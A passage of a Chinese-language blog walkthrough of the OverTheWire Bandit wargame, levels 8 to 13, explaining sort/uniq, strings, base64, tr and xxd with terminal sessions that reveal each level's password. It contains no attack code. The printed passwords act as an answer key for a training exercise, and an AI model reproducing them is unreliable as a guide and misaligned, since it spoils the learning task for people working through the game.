d选项。</span><br><span class="line">- d 只显示重复行 。</span><br><span class="line">- u 只显示文件中不重复的各行 。</span><br><span class="line">- n 前n个字段与每个字段前的空白一起被忽略。一个字段是一个非空格、非制表符的字符串，彼此由制表符和空格隔开（字段从0开始编号）。</span><br><span class="line">+ n 前n个字符被忽略，之前的字符被跳过（字符从0开始编号）。</span><br><span class="line">- f n 与- n相同，这里n是字段数。</span><br><span class="line">- s n 与＋n相同，这里n是字符数。</span><br></pre></td></tr></table></figure><br>首先sort data.txt<br>看到很多重复的<br><img src="/2018/10/28/bandit/8-9.jpg" alt=" "><br>于是用到uniq命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">bandit8@bandit:~$ sort data.txt | uniq -c</span><br><span class="line">     10 07iR6PwHwihvQ3av1fqoRjICCulpoyms</span><br><span class="line">     10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1</span><br><span class="line">     10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa</span><br><span class="line">     10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW</span><br><span class="line">     10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44</span><br><span class="line">     10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua</span><br><span class="line">     10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca</span><br><span class="line">     10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL</span><br><span class="line">     10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6</span><br><span class="line">     10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj</span><br><span class="line">     10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap</span><br><span class="line">     10 78rgduVcLZjLzZmooObdaN541MKV6IfQ</span><br><span class="line">     10 8qkrbCAUG9I28M49j9flUro5fWxenFzF</span><br><span class="line">     10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf</span><br><span class="line">     10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV</span><br><span class="line">     10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO</span><br><span class="line">     10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF</span><br><span class="line">     10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1</span><br><span class="line">     10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7</span><br><span class="line">     10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV</span><br><span class="line">     10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w</span><br><span class="line">     10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp</span><br><span class="line">     10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn</span><br><span class="line">     10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j</span><br><span class="line">     10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G</span><br><span class="line">     10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy</span><br><span class="line">     10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9</span><br><span class="line">     10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb</span><br><span class="line">     10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm</span><br><span class="line">     10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF</span><br><span class="line">     10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz</span><br><span class="line">     10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM</span><br><span class="line">     10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu</span><br><span class="line">     10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A</span><br><span class="line">     10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V</span><br><span class="line">     10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs</span><br><span class="line">     10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU</span><br><span class="line">     10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7</span><br><span class="line">     10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1</span><br><span class="line">     10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY</span><br><span class="line">     10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS</span><br><span class="line">     10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe</span><br><span class="line">     10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr</span><br><span class="line">     10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR</span><br><span class="line">     10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ</span><br><span class="line">     10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE</span><br><span class="line">     10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4</span><br><span class="line">     10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI</span><br><span class="line">     10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa</span><br><span class="line">     10 mdug9JbW836YVZh3ALULBAxODlinqonJ</span><br><span class="line">     10 MIpMch66sYTmmqepKYczlRA9aJrnkt68</span><br><span class="line">     10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q</span><br><span class="line">     10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F</span><br><span class="line">     10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET</span><br><span class="line">     10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR</span><br><span class="line">     10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ</span><br><span class="line">     10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w</span><br><span class="line">     10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1</span><br><span class="line">     10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt</span><br><span class="line">     10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g</span><br><span class="line">     10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV</span><br><span class="line">     10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn</span><br><span class="line">     10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN</span><br><span class="line">     10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9</span><br><span class="line">     10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu</span><br><span class="line">     10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL</span><br><span class="line">     10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa</span><br><span class="line">     10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT</span><br><span class="line">     10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw</span><br><span class="line">     10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X</span><br><span class="line">     10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I</span><br><span class="line">     10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp</span><br><span class="line">     10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj</span><br><span class="line">     10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF</span><br><span class="line">     10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX</span><br><span class="line">     10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT</span><br><span class="line">     10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe</span><br><span class="line">     10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT</span><br><span class="line">     10 tWwjd16fG17vGdjutfOygVTjEGxlijOS</span><br><span class="line">     10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O</span><br><span class="line">      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br><span class="line">     10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i</span><br><span class="line">     10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz</span><br><span class="line">     10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK</span><br><span class="line">     10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY</span><br><span class="line">     10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN</span><br><span class="line">     10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX</span><br><span class="line">     10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt</span><br><span class="line">     10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP</span><br><span class="line">     10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy</span><br><span class="line">     10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP</span><br><span class="line">     10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC</span><br><span class="line">     10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0</span><br><span class="line">     10 XURYdoIx95clq6s90MORDydQ187DxQhS</span><br><span class="line">     10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp</span><br><span class="line">     10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n</span><br><span class="line">     10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb</span><br><span class="line">     10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY</span><br><span class="line">     10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt</span><br><span class="line">     10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0</span><br><span class="line">     10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE</span><br></pre></td></tr></table></figure><br>看到<code>UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</code>这个字符只出现了一行，所以肯定是他啦<br>这个其实更简单的可以试试 <code>sort data.txt | uniq -u</code></p><p>因为当时就知道-c命令用法，后来发现-u是直接显示不重复的行，就更方便了。</p><h2 id="bandit9-10"><a href="#bandit9-10" class="headerlink" title="bandit9-10"></a>bandit9-10</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>先开始我们 cat data.txt发现很多东西都不可读m,是乱码所以我们用到了strings命令<br>strings - print the strings of printable characters in files.<br>意思是， 打印文件中可打印的字符。<br>因为题目说了以“==”开头的就是你需要的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bandit9@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit9@bandit:~$ strings data.txt </span><br><span class="line">这里其实已经可以找到flag了，但是为了防止上次那种坑，我们还是让他直接输出key</span><br><span class="line">bandit9@bandit:~$ strings data.txt | grep &quot;=&quot;</span><br><span class="line">2========== the</span><br><span class="line">========== password</span><br><span class="line">&gt;t=yP</span><br><span class="line">rV~dHm=</span><br><span class="line">========== isa</span><br><span class="line">=FQ?P\U</span><br><span class="line">=F[</span><br><span class="line">pb=x</span><br><span class="line">J;m=</span><br><span class="line">=)$=</span><br><span class="line">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span><br><span class="line">iv8!=</span><br></pre></td></tr></table></figure></p><h2 id="bandit-10-11"><a href="#bandit-10-11" class="headerlink" title="bandit 10-11"></a>bandit 10-11</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, which contains base64 encoded data<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>可以看到说文件被base64编码了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit10@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit10@bandit:~$ cat data.txt</span><br><span class="line">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</span><br><span class="line">bandit10@bandit:~$ base64 -d data.txt </span><br><span class="line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure><br>linux下base64用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用法：base64 [选项]... [文件]</span><br><span class="line">使用 Base64 编码/解码文件或标准输入输出。</span><br><span class="line">  -d, --decode          解码数据</span><br><span class="line">  -i, --ignore-garbag   解码时忽略非字母字符</span><br><span class="line">  -w, --wrap=字符数     在指定的字符数后自动换行(默认为76)，0 为禁用自动换行</span><br><span class="line">      --help            显示此帮助信息并退出</span><br><span class="line">      --version         显示版本信息并退出</span><br><span class="line">如果没有指定文件，或者文件为&quot;-&quot;，则从标准输入读取。</span><br><span class="line">数据以 RFC 3548 规定的 Base64 字母格式进行编码。 解码时，输入数据(加密流)可能包含一些非有效 Base64 字符的新行字符。可以尝试用 --ignore-garbage 选项来恢复加密流中任何非 base64 字符。</span><br></pre></td></tr></table></figure></p><h2 id="bandit-11-12"><a href="#bandit-11-12" class="headerlink" title="bandit 11-12"></a>bandit 11-12</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd.<br>题目意思是把每个字母包括大小写都用后13个字母替换了，也就是a–&gt;m<br>Linux里面tr命令正好可以干这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit11@bandit:~$ cat data.txt </span><br><span class="line">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</span><br><span class="line">bandit11@bandit:~$ cat data.txt | tr &apos;a-zA-Z&apos; &apos;n-za-mN-ZA-M&apos;</span><br><span class="line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure><br>Linux tr命令详解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tr [-cdst][--help][--version][第一字符集][第二字符集]  </span><br><span class="line">tr [OPTION]…SET1[SET2] </span><br><span class="line">-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</span><br><span class="line">-d, --delete：删除指令字符</span><br><span class="line">-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br><span class="line">-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="line">--help：显示程序用法信息</span><br><span class="line">--version：显示程序本身的版本信息</span><br><span class="line">字符集合的范围：</span><br><span class="line">\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</span><br><span class="line">\\ 反斜杠</span><br><span class="line">\a Ctrl-G 铃声</span><br><span class="line">\b Ctrl-H 退格符</span><br><span class="line">\f Ctrl-L 走行换页</span><br><span class="line">\n Ctrl-J 新行</span><br><span class="line">\r Ctrl-M 回车</span><br><span class="line">\t Ctrl-I tab键</span><br><span class="line">\v Ctrl-X 水平制表符</span><br><span class="line">CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</span><br><span class="line">[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</span><br><span class="line">[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</span><br><span class="line">[:alnum:] ：所有字母字符与数字</span><br><span class="line">[:alpha:] ：所有字母字符</span><br><span class="line">[:blank:] ：所有水平空格</span><br><span class="line">[:cntrl:] ：所有控制字符</span><br><span class="line">[:digit:] ：所有数字</span><br><span class="line">[:graph:] ：所有可打印的字符(不包含空格符)</span><br><span class="line">[:lower:] ：所有小写字母</span><br><span class="line">[:print:] ：所有可打印的字符(包含空格符)</span><br><span class="line">[:punct:] ：所有标点字符</span><br><span class="line">[:space:] ：所有水平与垂直空格符</span><br><span class="line">[:upper:] ：所有大写字母</span><br><span class="line">[:xdigit:] ：所有 16 进位制的数字</span><br><span class="line">[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</span><br></pre></td></tr></table></figure><br>看几个结果就懂了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr &apos;abc&apos; &apos;123&apos;</span><br><span class="line">123defghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><br>这个是set1和set2相等字符数，直接替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr &apos;abcd&apos; &apos;123&apos;</span><br><span class="line">1233efghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><p>这个是set1大于set2，于是后面都用set2最后一个字符替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr -t &apos;abcd&apos; &apos;123&apos;</span><br><span class="line">123defghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><p>加了参数t以后全部按位替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo &quot;aaAA1bbBB2ccCC3&quot; | tr -s &apos;a-zA-Z&apos;</span><br><span class="line">aA1bB2cC3</span><br></pre></td></tr></table></figure><p>-s参数是删除连续字符</p><h2 id="bandit-12-13"><a href="#bandit-12-13" class="headerlink" title="bandit 12-13"></a>bandit 12-13</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd, mkdir, cp, mv<br>题目告诉我们给我们了个hexdump文件，我们需要copy到/tmp自己文件夹以后可能要用到xxd转二进制然后解压压缩包<br>Linux xxd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xxd 命令用于使用二进制或十六进制格式显示文件内容，可以将指定文件或标准输入以十六进制转储,也可以把十六进制转储转换成原来的二进制形式。</span><br><span class="line">以十六进制格式输出：</span><br><span class="line">od [选项] 文件</span><br><span class="line">od -d 文件  十进制输出</span><br><span class="line">   -o 文件  八进制输出</span><br><span class="line">   -x 文件  十六进制输出</span><br><span class="line">xxd 文件  输出十六进制</span><br></pre></td></tr></table></figure><br>mv命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常用的命令，经常用来备份文件或者目录。</span><br><span class="line">1．命令格式：</span><br><span class="line">    mv [选项] 源文件或目录 目标文件或目录</span><br><span class="line">2．命令功能：</span><br><span class="line">视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移至一个新的目录中。当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录名），它将所给的源文件或目录重命名为给定的目标文件名。当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。在跨文件系统移动文件时，mv先拷贝，再将原有文件删除，而链至该文件的链接也将丢失。</span><br><span class="line">3．命令参数：</span><br><span class="line">-b ：若需覆盖文件，则覆盖前先行备份。 </span><br><span class="line">-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</span><br><span class="line">-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</span><br><span class="line">-u ：若目标文件已经存在，且 source 比较新，才会更新(update)</span><br><span class="line">-t ： --target-directory=DIRECTORY move all SOURCE arguments into DIRECTORY，即指定mv的目标目录，该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后。</span><br></pre></td></tr></table></figure><br>tar解压命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">解压</span><br><span class="line">语法：tar [主选项+辅选项] 文件或者目录</span><br><span class="line">使用该命令时，主选项是必须要有的，它告诉tar要做什么事情，辅选项是辅助使用的，可以选用。</span><br><span class="line">主选项：</span><br><span class="line">c 创建新的档案文件。如果用户想备份一个目录或是一些文件，就要选择这个选项。</span><br><span class="line">r 把要存档的文件追加到档案文件的未尾。例如用户已经作好备份文件，又发现还有一个目录或是一些文件忘记备份了，这时可以使用该选项，将忘记的目录或文件追加到备份文件中。</span><br><span class="line">t 列出档案文件的内容，查看已经备份了哪些文件。</span><br><span class="line">u 更新文件。就是说，用新增的文件取代原备份文件，如果在备份文件中找不到要更新的文件，则把它追加到备份文件的最后。</span><br><span class="line">x 从档案文件中释放文件。</span><br><span class="line">辅助选项：</span><br><span class="line">b 该选项是为磁带机设定的。其后跟一数字，用来说明区块的大小，系统预设值为20（20*512 bytes）。</span><br><span class="line">f 使用档案文件或设备，这个选项通常是必选的。</span><br><span class="line">k 保存已经存在的文件。例如我们把某个文件还原，在还原的过程中，遇到相同的文件，不会进行覆盖。</span><br><span class="line">m 在还原文件时，把所有文件的修改时间设定为现在。</span><br><span class="line">M 创建多卷的档案文件，以便在几个磁盘中存放。</span><br><span class="line">v 详细报告tar处理的文件信息。如无此选项，tar不报告文件信息。</span><br><span class="line">w 每一步都要求确认。</span><br><span class="line">f 这个参数确实是必选的,要不你就找不到你的tar文件</span><br><span class="line">其实用的时候感觉上有些多余,既然它是必选,那就干脆固化到tar这个命令本身就是啊</span><br><span class="line">可是它偏偏不是这样的,如果你不用这个参数,他就告述你什么&quot;文件不存在&quot;的错误</span><br><span class="line">叫人觉得这是一个设计不良的软件(或称命令把)</span><br><span class="line">v 也很重要,通常就能看出详细信息</span><br><span class="line">所以构造tar包通常是用命令</span><br><span class="line">tar cvf tar包名.tar 目录,文件列表</span><br><span class="line">所谓目录文件列表就是以空格形式分割文件和目录</span><br><span class="line">而解tar包通常是命令</span><br><span class="line">tar xvf tar包名.tar 目录,文件列表</span><br></pre></td></tr></table></figure><br>接下来是完整演示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:~$ mkdir /tmp/bobose3</span><br><span class="line">mkdir: cannot create directory ‘/tmp/bobose3’: File exists</span><br><span class="line">bandit12@bandit:~$ mkdir /tmp/bobo123</span><br><span class="line">bandit12@bandit:~$ cp data.txt /tmp/bobo123</span><br><span class="line">bandit12@bandit:~$ cd /tmp/bobo123</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ xxd -r data.txt bobo</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ lsa</span><br><span class="line">-bash: lsa: command not found</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: gzip compressed data, was &quot;data2.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ 